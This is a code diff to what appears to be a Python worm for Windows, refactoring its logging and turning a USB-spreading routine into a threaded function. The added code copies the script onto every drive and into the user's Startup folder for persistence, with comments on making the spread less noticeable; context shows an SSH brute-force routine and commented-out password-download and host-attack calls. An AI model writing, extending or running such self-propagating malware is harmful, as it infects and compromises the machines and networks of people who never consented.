@@ -7,7 +7,6 @@
 import nmap
 import paramiko
 import os
-import coloredlogs, logging
 import socket
 from urllib.request import urlopen
 import urllib
@@ -16,45 +15,23 @@ from ftplib import FTP
 import ftplib
 from shutil import copy2
 import win32api
-
 import netifaces
+from threading import Thread
+
+# ----- -----
+import networking
+# ----- -----
+
 # ------------------- Logging ----------------------- #
+import coloredlogs, logging
 logger = logging.getLogger(__name__)
-coloredlogs.install(level='DEBUG', logger=logger)
+coloredlogs.install(fmt='%(message)s',level='DEBUG', logger=logger)
 # --------------------------------------------------- #
 
 
 # gets gateway of the network
 gws = netifaces.gateways()
 gateway = gws['default'][netifaces.AF_INET][0]
-
-def get_private_ip():
-    """
-    Gets private IP address of this machine.
-    This will be used for scanning other computers on LAN.
-
-    Returns:
-        private IP address
-    """
-    logger.debug("Getting private IP")
-    ip = socket.gethostbyname(socket.gethostname())
-    logger.debug("IP: " + ip)
-    return ip
-
-
-def get_public_ip():
-    """
-    Gets public IP address of this network.
-    You can access the router with this ip too.
-
-    Returns:
-        public IP address
-    """
-    logger.debug("Getting public IP")
-    import re
-    data = str(urlopen('http://checkip.dyndns.com/').read())
-    return re.compile(r'Address: (\d+.\d+.\d+.\d+)').search(data).group(1)
-
 
 def scan_ssh_hosts():
     """
@@ -177,9 +154,12 @@ def bruteforce_ssh(host, wordlist):
         print(connection)
         time.sleep(5)
 
-
-def usbspreading():
-    # TODO:50 : Make this threaded.
+def drivespreading():
+    # This function makes the worm copy itself on other drives on the computer
+    # (also on the "startup" folder to be executed every time the computer boots)
+    
+    # WARNING: This function is very obvious to the user. The worm will be suddenly on every drive.
+    # You may want to change the code and e.g. copy the worm only on new drives 
     bootfolder = os.path.expanduser('~') + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
 
     while True:
@@ -187,18 +167,26 @@ def usbspreading():
         drives = drives.split('\000')[:-1]
         print(drives)
         for drive in drives:
-            if "C:\\" == drive:
-                copy2(__file__, bootfolder)
-            else:
-                copy2(__file__, drive)
+            try:
+                if "C:\\" == drive:
+                    copy2(__file__, bootfolder)
+                else:
+                    copy2(__file__, drive)
+            except:
+                pass
+        
         time.sleep(3)
+
+def start_drive_spreading():
+    # Starts "drivespreading" function as a threaded function. 
+    # This means that the code will spread on drives and execute other functions at the same time.
+    thread = Thread(target = drivespreading)
+    thread.start()
+
 
 
 def main():
-    #download_ssh_passwords("passwords.txt")
-    #for host in scan_ssh_hosts():
-        #bruteforce_ssh(host, "passwords.txt")
-    scan_ssh_hosts()
+    start_drive_spreading()
 
 
 if __name__ == "__main__":
